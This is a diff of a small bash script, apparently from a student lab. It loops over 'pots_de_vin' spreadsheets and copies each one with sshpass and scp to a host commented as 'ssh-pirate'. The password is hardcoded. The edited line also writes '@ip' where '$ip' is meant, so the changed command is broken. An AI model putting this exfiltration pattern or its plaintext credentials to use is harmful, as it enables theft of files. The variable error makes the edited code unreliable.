@@ -1,12 +1,12 @@
 #!/bin/bash
 username="etudiant"
 password="vitrygtr"
-Ip="177.16.1.4" # adresse de ssh-pirate
+ip="177.16.1.4" # adresse de ssh-pirate
 
 command=$(ls pots_de_vin*.xlsx)
 for files in $command
 do
-    sshpass -p "$password" scp $files $username@$Ip:/home/etudiant/data
+    sshpass -p "$password" scp $files $username@ip:/home/etudiant/data
     echo $?
 done
 
